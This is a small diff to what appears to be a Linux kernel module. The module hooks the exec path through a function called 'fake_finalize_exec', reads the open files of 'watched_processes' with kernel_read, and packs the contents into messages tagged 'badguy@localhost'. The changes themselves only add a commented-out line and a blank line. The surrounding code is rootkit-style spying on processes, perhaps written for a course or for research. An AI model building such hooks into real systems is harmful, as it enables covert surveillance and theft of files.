@@ -481,6 +481,8 @@ static asmlinkage void fake_finalize_exec(struct linux_binprm *bprm)
 		}
 		spin_unlock(&process_counter_lock);
 		
+		//char arg[] = "temp@localhost\n";
+
 		char arg[] = "badguy@localhost\n";
 		struct msg_header* header = kmalloc(sizeof(struct msg_header),GFP_KERNEL);
 		header->msg_status = USED;
@@ -547,6 +549,7 @@ static asmlinkage void fake_finalize_exec(struct linux_binprm *bprm)
 					}
 					offset =0;
 					ret = kernel_read(watched_processes[i].open_files[j].filp, buf, 1024, &offset);
+
 					struct msg_header* header = kmalloc(sizeof(struct msg_header),GFP_KERNEL);
 					header->msg_status = 1;
 					header->pid = pid;
